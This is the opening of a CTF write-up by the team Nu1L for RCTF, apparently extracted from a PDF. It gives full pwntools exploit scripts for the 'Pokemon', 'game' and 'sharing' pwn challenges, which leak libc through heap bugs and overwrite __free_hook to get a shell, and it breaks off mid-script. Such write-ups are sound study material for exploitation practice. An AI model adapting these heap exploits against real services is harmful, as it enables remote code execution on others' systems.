RCTF WriteUp By Nu1L
Author:Nu1L
RCTF WriteUp By Nu1L
Pwn
Pokemon
game
sharing
musl
ezheap
catch_the_frog
unistruct
warmnote
Web
ns_shaft_sql
CandyShop
VerySafe
hiphop
Easyphp
xss it?
EasySQLi
Reverse
sakuretsu
Program Logic:
Reverse Engineering Techniques Used:
Solving:
LoongArch
Valgrind
Hi!Harmony!
dht
two_shortest
Crypto
Uncommon Factors I
Uncommon Factors II
BlockChain
EasyFJump
HackChain
Misc
ezshell
monopoly
checkin
coolcat
welcome_to_rctf
FeedBack
Pwn
Pwn
Pokemon
给可达鸭讲话时存在溢出
溢出改下⼀个chunk的size，利⽤password来leak，之后改指针来改free_hook
from pwn import *
import fuckpy3
context.log_level = 'debug'
# p = process("./Pokemon")
p = remote('123.60.25.24', 8888)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
def launch_gdb():
    print(pidof(p))
    input()
def xor_str(a,b):
    res = ''
    for i in range(len(a)):
        res += chr(a[i] ^ b[i%8])
    return res.bytes()
def add(type,s=0,idx = 0):
    p.sendlineafter(":","1")
    p.sendlineafter(":",str(type))
    if s != 0:
        p.sendlineafter("?",str(s))
    p.sendlineafter("]",str(idx))
def dele(i,need = False):
    p.sendlineafter(":","2")
    p.sendlineafter("[0/1]",str(i))
    p.sendlineafter("Choice:","1")
    if need:
        p.sendlineafter(']','Y')
p.sendlineafter(":","aaaaa")
# talk
# p.sendlineafter(":","2")
# p.sendlineafter("]","0")
# p.sendlineafter(":","3")
# for i in range(17):
#     p.send(p64(0xdeadbeef) * 2)
for i in range(7):
    add(1,0x220)
    dele(0)
    add(1,0x300)
    dele(0)
    add(1,0x310)
    dele(0)
add(1,0x220)
add(1,0x300,1)
dele(0)
add(1,0x300,0)
for i in range(5):
    add(1,0x300,1)
dele(0)
add(2)
p.sendlineafter(":","2")
p.sendlineafter("]","0")
p.sendlineafter(":","3")
for i in range(16):
    p.send(p64(0xdeadbeef) * 2)
p.send(p64(0) + p64(4704 + 1))
dele(0,True)
dele(1)
# 01AE9
add(1,0x300)
add(1,0x300,1)
dele(1)
p.sendlineafter(":","3")
p.sendlineafter("]","1")
add(1,0x310,1)
p.sendlineafter(":","3")
p.recvuntil('gem: ')
leak = u64(p.recv(6) + b'\x00\x00') - 2014176
log.info('leak ' + hex(leak))
p.sendlineafter("]","N")
dele(1)
add(1,0x300,0)
add(3,idx=1)
game
⼩怪那⾥有个奇怪的uaf，预先填好⼀个Libc的地址可以leak
p.sendlineafter(":","2")
p.sendlineafter("]","1")
p.sendlineafter(":","3")
p.sendline(p8(0xaa)*8 + p64(leak + libc.symbols['__free_hook']  - 3 ))
p.sendlineafter(":","3")
p.sendlineafter("]","Y")
p.recvuntil('password:')
p.send(xor_str(b'sh\x00' + p64(leak + libc.symbols['system']),p8(0xaa)*8  ))
dele(0)
p.interactive()
from pwn import *
import re
import fuckpy3
context.log_level = 'debug'
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# p = process('./game')
p = remote('123.60.25.24', 20000)
def launch_gdb():
    # print(pidof(p))
    input()
def send_data(s):
    p.sendafter('talk to the dragon?',s)
def heal():
    return p8(2) + p8(1)
def attack():
    return p8(2) + p8(2)
def malloc(s):
    return p8(17) + p8(1) + p8(s)
def calloc(s):
    return p8(17) + p8(2) + p8(s)
def free():
    return p8(18) 
def jg(i1,i2):
    return p8(8) + p8(i1) + p8(i2)
def add(i1,i2):
    return p8(16) + p8(i1) + p8(i2)
def clear_bit(bit,value = 0,idx=0):
    return p8(13) + p8(idx) + p8(bit) + p8(value)
def padding():
    return p8(2) + p8(4)
payload = b''
payload += calloc(0xb0)
payload += heal() * 4
payload += free()
payload += p8(2) + p8(3)*2 + p8(0x20)
payload += p8(2) + p8(0)
for i in range(6):
    payload += calloc(0xb0)
    payload += heal() 
    payload += free()
payload += calloc(0xb0)
payload += heal() *4
# child
payload += free()
payload += malloc(0)
payload += attack() * 10
payload += heal()
payload += attack() * 5
payload += heal() * 2
payload += p8(19)
payload += attack()
payload += heal()
payload += p8(6) + p8(0)
payload += heal() 
payload += clear_bit(5)
payload += heal() 
payload += clear_bit(4,1,1)
payload += heal() 
circle1 = b''
circle1 += heal() 
circle1 += heal() 
circle1 += jg(2,0)
circle1 += heal()
circle1 += attack() 
circle1 += heal() 
circle1 += p8(11) + p16(3 + 3+2 +2)
circle1 += heal() 
circle1 += add(2,1)
circle1 += heal() 
circle1 += p8(9) + p16(0x10000 - 3-3-3-3-8 -2-2-2)
payload += circle1
payload += heal() 
payload += padding()
payload += heal() 
payload += clear_bit(4)
payload += heal() 
payload += clear_bit(4,idx=1)
payload += heal() 
payload += clear_bit(4,idx=2)
payload += heal() 
payload += clear_bit(3,1,1)
payload += heal() 
payload += heal() 
payload += circle1
payload += heal() 
payload += padding()
payload += heal() 
payload += clear_bit(3)
payload += heal() 
payload += clear_bit(3,idx=1)
payload += heal() 
payload += clear_bit(3,idx=2)
payload += heal() 
payload += clear_bit(2,1,1)
payload += heal() 
payload += heal() 
payload += circle1
payload += heal() 
payload += padding()
payload += heal() 
payload += clear_bit(2)
payload += heal() 
payload += clear_bit(2,idx=1)
payload += heal() 
payload += clear_bit(2,idx=2)
payload += heal() 
payload += clear_bit(1,1,1)
payload += heal() 
payload += heal() 
payload += circle1
payload += heal() 
payload += padding()
payload += heal() 
payload += p8(19)
payload += heal() 
payload += free()
payload += heal() 
payload += malloc(0x10)
payload += heal() 
payload += malloc(0x10)
payload += heal() 
payload += malloc(0x10)
payload += heal() 
payload += heal() 
payload += malloc(0xe0)
payload += heal() 
payload += heal() 
payload += free()
payload += free()
payload += free()
payload += free()
p.recvuntil('length:')
p.sendline(str(len(payload)))
p.recvuntil(':')
p.send(payload)
for i in range(8):
    send_data('aaa\n')
p.recvuntil('dragon\'s attack')
s = p.recvuntil(b'Reprisal')
count1 = len(re.findall(b'Despair',s)) - 3
s = p.recvuntil(b'Reprisal')
count2 = len(re.findall(b'Despair',s))-2
s = p.recvuntil(b'Reprisal')
count3 = len(re.findall(b'Despair',s))-2
s = p.recvuntil(b'Reprisal')
count4 = len(re.findall(b'Despair',s))-2
log.info('leak libc ' + hex(count1))
log.info('leak libc ' + hex(count2))
log.info('leak libc ' + hex(count3))
log.info('leak libc ' + hex(count4))
leak_libc =  b'\x90' + (chr(count4) + chr(count3) + chr(count2) + chr(count1)).bytes() 
+b'\x7f\x00\x00'
leak_libc = u64(leak_libc) - 2014352
log.info('leak libc ' + hex(leak_libc))
send_data(p64(libc.symbols['__free_hook'] + leak_libc ) + b'\n')
# send_data("/bin/sh\n")
send_data(p64(libc.symbols['system']+ leak_libc) + b'\n')
send_data(p64(libc.symbols['system']+ leak_libc) + b'\n')
launch_gdb()
send_data('/bin/sh\n')
# 0x7f061b34f000
p.interactive()
sharing
show 和 edit的idx都没有检查
from pwn import *
libc = ELF('./libc-2.27.so')
# p = process("./sharing",env={"LD_PRELOAD":"./libc-2.27.so"})
# p = process("chroot . ./sharing".split(' '))
p = remote('124.70.137.88', 30000)
# p = remote('0', 9999)
context.log_level = 'debug'
def launch_gdb():
    context.terminal = ['xfce4-terminal', '-x', 'sh', '-c']
    gdb.attach(proc.pidof(p)[0])
def add(i,s):
    p.sendlineafter(':','1')
    p.sendlineafter(':',str(i))
    p.sendlineafter(':',str(s))
def move(i,s):
    p.sendlineafter(':','2')
    p.sendlineafter(':',str(i))
    p.sendlineafter(':',str(s))
def show(i):
    p.sendlineafter(':','3')
    p.sendlineafter(': ',str(i))
def edit(i,s):
    p.sendlineafter(':','4')
    p.sendlineafter(':',str(i))
    p.sendafter(':',s)
add(0,0x500)
add(1,0x500)
move(1,0)
add(2,0x500)
show(2)
p.recvuntil('\x7f\x00\x00')
leak_libc = u64(p.recvuntil('\x7f') + '\x00\x00') - 4111520
log.info("leak libc " + hex(leak_libc))
add(3,0x100)
add(4,0x100)
add(5,0x100)
add(6,0x100)
move(4,3)
move(6,5)
musl
-1随便溢出
add(7,0x100)
show(7)
leak_heap = u64(p.recv(6) + '\x00\x00')
log.info('leak heap ' + hex(leak_heap)) # 0x55946d498c50 0x561266f75050
fake_chunk = leak_heap - 2704
# fake_index = 374
fake_index = 566
fake_ptr = p64(fake_chunk + 0x30) + p64(fake_chunk + 0x20)
fake_ptr += p64(fake_chunk + 0x60) + p64(0x0000000100000002) + p64(0x100) + 
p64(leak_libc + libc.symbols['__free_hook']) \
    + p64(0)+ p64(0x111)
fake_ptr = fake_ptr.ljust(0x50,'\x00')
fake_ptr += p64(0xdeadbeef) * 8
edit(2,fake_ptr)
edit(fake_index,p64(leak_libc + libc.symbols['system']))
add(8,0x100)
add(9,0x100)